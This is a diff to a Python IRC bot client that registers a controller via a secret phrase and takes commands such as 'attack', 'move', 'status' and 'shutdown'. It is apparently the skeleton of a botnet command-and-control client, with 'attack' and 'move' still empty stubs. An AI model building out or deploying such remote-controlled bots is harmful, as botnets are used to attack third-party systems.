@@ -19,20 +19,6 @@ class botClient:
         self.controller = None
         self.controller_nick = None
 
-    def log(self, message):
-        print(message)
-
-    def send_msg(self, message):
-        self.irc_socket.send(message.encode())
-    def recv_msg(self):
-        return self.irc_socket.recv(2040).decode()  #receive the text
-
-    def send_to_channel(self, message):
-        self.send_msg("PRIVMSG " + self.channel + " :" + message + "\n")
-
-    def send_to_user(self, nick, message):
-        self.send_msg("PRIVMSG " + nick + " :" + message + "\n")
-
     def start_client(self):
         self.irc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.__connect()
@@ -45,8 +31,9 @@ class botClient:
             if not self.check_msg(text):
                 continue
             input_list = text.split(' :')
-            command = input_list[1]
+            command = input_list[1].strip()
 
+            # execute the command
             self.receive_command(command)
 
         self.irc_socket.close()
@@ -68,16 +55,18 @@ class botClient:
         sender = text.split(':')[1].split(' ')[0]
         input_list = text.split(' :')
         # get the message sent by the sender
-        message = input_list[1]
+        message = input_list[1].strip()
 
         # if no controller is defined
         if self.controller is None:
             # if the message is the secret phrase, assign the controller
-            if self.secret_phrase in message:
+            if self.secret_phrase == message:
                 self.controller = sender
                 self.controller_nick, _ = sender.split('!')
                 self.log("Controller Identified: " + self.controller)
-            return True
+                return True
+            else:
+                return False
         # if the message is from the current controller
         elif self.controller == sender:
             return True
@@ -85,18 +74,17 @@ class botClient:
         else:
             return False
 
+    # function to receive and execute the command sent by the controller
     def receive_command(self, command):
         # TODO add function call for each command
-        if command.startswith("attack"): 
+        if command.startswith("attack"):
             pass
         elif command.startswith("move"):
             pass
         elif command == "status":
-            pass
-        elif command == "quit":
-            pass
+            self.send_status()
         elif command == "shutdown":
-            pass
+            self.__shutdown()
 
     # Code adapted from: https://pythonspot.com/en/building-an-irc-bot/
     def get_text(self):
@@ -104,6 +92,31 @@ class botClient:
         if text.find('PING') != -1:
             self.send_msg('PONG ' + text.split()[1] + 'rn')
         return text
+
+    def send_status(self):
+        self.send_to_user(self.controller_nick, self.bot_nick)
+        self.log("Status sent to Controller")
+
+    # Closes connecting and terminates bot
+    def __shutdown(self):
+        self.log("Shutting Down...")
+        self.irc_socket.close()
+        sys.exit()
+
+
+    def log(self, message):
+        print(message.strip("\n") + "\n")
+
+    def send_msg(self, message):
+        self.irc_socket.send(message.encode())
+    def recv_msg(self):
+        return self.irc_socket.recv(2040).decode()  #receive the text
+
+    def send_to_channel(self, message):
+        self.send_msg("PRIVMSG " + self.channel + " :" + message + "\n")
+
+    def send_to_user(self, nick, message):
+        self.send_msg("PRIVMSG " + nick + " :" + message + "\n")
 
 # argparse function to handle user input
 # Reference: https://docs.python.org/3.6/howto/argparse.html
